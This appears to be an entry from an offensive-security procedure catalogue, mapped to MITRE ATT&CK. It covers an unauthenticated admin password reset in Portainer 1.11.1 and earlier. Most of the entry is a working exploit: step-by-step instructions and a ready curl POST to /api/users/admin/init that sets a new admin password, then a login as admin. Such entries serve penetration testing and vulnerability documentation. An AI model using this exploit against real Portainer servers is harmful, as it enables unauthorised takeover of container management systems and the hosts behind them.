---
id: ca665b6f-fdbd-49c5-8a22-92e8fecc0f54
name: Portainer <= 1.11.1 Admin Password Reset (Unauthenticated)
type: procedure
verified: false
submitted: false
created_at: '2019-12-10T00:20:20.259168+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
- '[[Initial Access|TA0001 - Initial Access]]'
techniques:
- '[[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]'
platforms:
- Linux
tags:
- '[[authentication]]'
- '[[known vulnerability]]'
- '[[unauthorized]]'
- '[[Web Applications]]'
commands:
- '[[curl Make a POST Request with JSON Data]]'
---

# Portainer <= 1.11.1 Admin Password Reset (Unauthenticated)

## Summary

Portainer version 1.11.1 and earlier contains a vulnerability which allows unauthenticated users to reset the admin password by sending a POST request to to the server. 

## Description

# Description

Portainer version 1.11.1 and earlier contains a vulnerability which allows unauthenticated users to reset the admin password by sending a POST request to to the server.



# Instructions

Use cURL to exploit the vulnerability. The request must:

- Send a POST request to "/api/users/admin/init" on the Portainer server

- Set the "Content-Type" to "application/json"

- Include a "password" key and value in the POST data

Eg:  curl -H "Content-Type: application/json" http://localhost:9000/api/users/admin/init -d '{"password":"s3cr3t"}'





**Command** ([[curl Make a POST Request with JSON Data]]):

```bash
curl -H "Content-Type: application/json" http://_TARGET_IP/$_PATH -d '{"$_KEY":"$_VALUE"}'
```





After submitting the POST request, attempt to login with the username "admin" and the new password.

## Platforms

- Linux

## Products

- Linux
- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access|TA0001 - Initial Access]]

### Techniques

- [[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]

## Commands Used

- [[curl Make a POST Request with JSON Data]]

## Tags

- [[authentication]]
- [[known vulnerability]]
- [[unauthorized]]
- [[Web Applications]]


